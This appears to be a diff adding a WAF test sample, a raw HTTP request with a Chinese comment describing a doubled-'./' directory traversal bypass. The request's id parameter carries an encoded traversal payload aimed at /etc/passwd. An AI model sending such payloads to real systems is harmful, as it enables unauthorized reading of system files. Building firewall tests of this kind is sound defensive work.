@@ -1,0 +1,9 @@
+# 目录遍历_双写./
+# 未对传入参数进行严格检查过滤，例如在进行关键字“./”替换的时候只替换了一次，没有考虑到双写的情况，攻击者可以利用这一点来绕过检查。
+GET /?id=...%2F%2F...%2F%2F...%2F%2F...%2F%2F...%2F%2Fetc%2Fpasswd&bid=hd_tag_m8mv23ry HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23ry
+RM-PRO-Token: c6a8e514706a235d55397ef1d05cc71f
+RM-PRO-Time: 1742808341092
+User-Agent: curl/7.83.1
+
